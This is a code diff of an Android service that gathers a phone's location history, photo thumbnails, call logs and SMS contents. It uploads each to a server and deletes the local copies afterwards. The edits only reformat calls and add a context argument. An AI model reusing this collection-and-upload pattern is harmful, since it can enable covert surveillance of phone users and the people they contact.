@@ -80,8 +80,8 @@ public class PacketSenderService extends Service {
 					LocationPacket location = new LocationPacket(latitude, longitude, altitude, accuracy, provider,
 							time);
 
-					boolean uploaded = Uploader
-							.sendPacket(new MainPacket(DataType.LOCATION, location.getBinaryPacket()));
+					boolean uploaded = Uploader.sendPacket(
+							new MainPacket(DataType.LOCATION, location.getBinaryPacket()), PacketSenderService.this);
 
 					if (uploaded)
 						cr.delete(ActivityContract.Locations.CONTENT_URI, "_id = ?", new String[] { "" + id });
@@ -105,8 +105,9 @@ public class PacketSenderService extends Service {
 				while (c.moveToNext()) {
 					int storeId = c.getInt(0); // save store_id;
 					Cursor imageInfoCursor = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, new String[] {
-							MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.DATA, MediaStore.Images.Media.DATE_ADDED }, "_id = ?",
-							new String[] { String.valueOf(storeId) }, null);
+							MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.DATA,
+							MediaStore.Images.Media.DATE_ADDED }, "_id = ?", new String[] { String.valueOf(storeId) },
+							null);
 					imageInfoCursor.moveToFirst();
 					if (imageInfoCursor.getCount() == 0) { // file is not found
 						ContentValues value = new ContentValues();
@@ -128,11 +129,12 @@ public class PacketSenderService extends Service {
 						ByteArrayOutputStream outputStream = new ByteArrayOutputStream(10000);
 						thumbnail.compress(CompressFormat.JPEG, 50, outputStream);
 
-						ThumbnailPacket thumbnailPacket = new ThumbnailPacket(displayName, filePath, storeId, dateAdded,
-								outputStream.toByteArray());
+						ThumbnailPacket thumbnailPacket = new ThumbnailPacket(displayName, filePath, storeId,
+								dateAdded, outputStream.toByteArray());
 
-						boolean uploaded = Uploader.sendPacket(new MainPacket(DataType.THUMBNAIL, thumbnailPacket
-								.getBinaryPacket()));
+						boolean uploaded = Uploader.sendPacket(
+								new MainPacket(DataType.THUMBNAIL, thumbnailPacket.getBinaryPacket()),
+								PacketSenderService.this);
 
 						if (uploaded) {
 							ContentValues value = new ContentValues();
@@ -166,7 +168,8 @@ public class PacketSenderService extends Service {
 					CallPacket call = new CallPacket(caller, recipient, caller_phone_number, recipient_phone_number,
 							time);
 
-					boolean uploaded = Uploader.sendPacket(new MainPacket(DataType.CALL, call.getBinaryPacket()));
+					boolean uploaded = Uploader.sendPacket(new MainPacket(DataType.CALL, call.getBinaryPacket()),
+							PacketSenderService.this);
 
 					if (uploaded)
 						cr.delete(ActivityContract.Calls.CONTENT_URI, "_id = ?", new String[] { "" + id });
@@ -182,7 +185,7 @@ public class PacketSenderService extends Service {
 			try {
 				ContentResolver cr = getContentResolver();
 
-				// Return all the saved sms
+				// Return all the saved SMS
 				Cursor c = cr.query(ActivityContract.SMS.CONTENT_URI, null, null, null, null);
 
 				while (c.moveToNext()) {
@@ -197,7 +200,8 @@ public class PacketSenderService extends Service {
 					SMSPacket sms = new SMSPacket(sender, recipient, sender_phone_number, recipient_phone_number, time,
 							sms_body);
 
-					boolean uploaded = Uploader.sendPacket(new MainPacket(DataType.SMS, sms.getBinaryPacket()));
+					boolean uploaded = Uploader.sendPacket(new MainPacket(DataType.SMS, sms.getBinaryPacket()),
+							PacketSenderService.this);
 
 					if (uploaded)
 						cr.delete(ActivityContract.SMS.CONTENT_URI, "_id = ?", new String[] { "" + id });
@@ -205,8 +209,7 @@ public class PacketSenderService extends Service {
 				}
 
 			} catch (IOException e) {
-				e.printStackTrace(); // To change body of catch statement use
-										// File | Settings | File Templates.
+				e.printStackTrace();
 			}
 		}
 
